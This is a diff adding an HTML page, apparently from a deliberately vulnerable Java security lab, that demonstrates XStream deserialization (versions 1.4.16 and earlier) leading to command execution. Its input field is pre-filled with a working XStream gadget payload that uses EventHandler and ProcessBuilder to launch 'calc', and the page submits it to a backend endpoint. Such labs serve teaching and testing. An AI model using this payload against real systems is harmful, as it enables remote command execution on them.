@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{commons/commons::head}"></div>
+
+<body>
+<div class="layuimini-container">
+  <div class="layuimini-main">
+    <div class="layui-row layui-col-space15">
+      <div class="layui-col-md12">
+        <div class="layui-row layui-col-space10">
+          <fieldset class="layui-elem-field layui-field-title" style="margin-top: 20px;">
+            <legend>XStream 反序列化</legend>
+          </fieldset>
+          <!--漏洞简介-->
+          <div class="layui-col-md12">
+            <div class="layui-card">
+              <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>漏洞描述</div>
+              <div class="layui-card-body layui-text layadmin-text">
+                <p>XStream是一个轻量级、简单易用的开源Java类库，它主要用于将对象序列化成XML（JSON）或反序列化为对象。</p>
+                <p>XStream 在解析XML文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.16 及之前版本黑名单存在缺陷，攻击者可利用sun.rmi.registry.RegistryImpl_Stub构造RMI请求，进而执行任意命令。</p>
+              </div>
+            </div>
+          </div>
+          <!--漏洞测试-->
+          <div class="layui-col-md12">
+            <div class="layui-card">
+              <div class="layui-card-header"><i class="fa fa-hand-o-down icon"></i>漏洞测试</div>
+              <div class="layui-card-body layui-text layadmin-text">
+                <form class="layui-form" id="form" th:action="@{/home/xstream}" method="get">
+                  <div class="layui-form-item">
+                    <label class="layui-form-label">content: </label>
+                    <div class="layui-input-block">
+                      <input type="text" name="content" id="content" lay-verify="required"
+                             lay-reqtext="content不能为空" value="&lt;sorted-set&gt;&lt;dynamic-proxy&gt;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&lt;handler class=&quot;java.beans.EventHandler&quot;&gt;&lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;command&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/command&gt;&lt;/target&gt;&lt;action&gt;start&lt;/action&gt;&lt;/handler&gt;&lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;"
+                             autocomplete="off" class="layui-input">
+                    </div>
+                  </div>
+
+                  <div class="layui-form-item">
+                    <div class="layui-input-block">
+                      <button type="button" id="submit" class="layui-btn" lay-submit=""
+                              lay-filter="demo1">立即提交
+                      </button>
+                      <button type="reset" class="layui-btn layui-btn-primary">重置</button>
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+          <!--执行结果-->
+          <div class="layui-col-md12">
+            <div class="layui-card">
+              <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>测试结果</div>
+              <div class="layui-card-body layui-text layadmin-text">
+                <!--                                <pre th:text="${results}" style="color: red;font-size: 15px;"></pre>-->
+                <pre id="results" style="color: red;font-size: 15px;"></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div th:replace="~{commons/commons::script}">
+</div>
+
+<script>
+  $("#submit").click(function () {
+    var content = $("#content").val();
+    if (content.length === 0) {
+      return;
+    }
+    // var check = $("#check").is(':checked');
+
+    $.ajax({
+      url: "[[@{/home/xstream}]]",
+      type: "POST",
+      // headers: {
+      //     'Content-Type': "text/xml",
+      // },
+      contentType: "text/xml",
+      data: content,
+      success: function (result) {
+        $("#results").empty();
+        $("#results").append(he.escape(result));
+      },
+      error: function () {
+        alert("请求发送失败！")
+      },
+    })
+  })
+</script>
+</body>
+</html>
